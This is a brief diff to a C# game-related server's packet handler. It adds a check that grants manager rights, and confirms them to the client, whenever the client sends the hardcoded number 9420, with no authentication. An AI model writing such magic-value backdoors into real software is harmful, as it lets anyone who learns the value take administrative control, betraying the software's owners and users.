@@ -340,6 +340,10 @@ namespace QinDevilServer {
                 switch (signal) {
                     case 0:
                         int line = SerializeTool.ByteToInt(buffer, ref startIndex);
+                        if (line == 9420) {
+                            userInfo.Manager = true;
+                            server.SendPackage(userInfo.ClientInfo, 20, new byte[] { 1 });
+                        }
                         userInfo.LineName = line;
                         Dispatcher.Invoke(() => {
                             lock (gameData) {
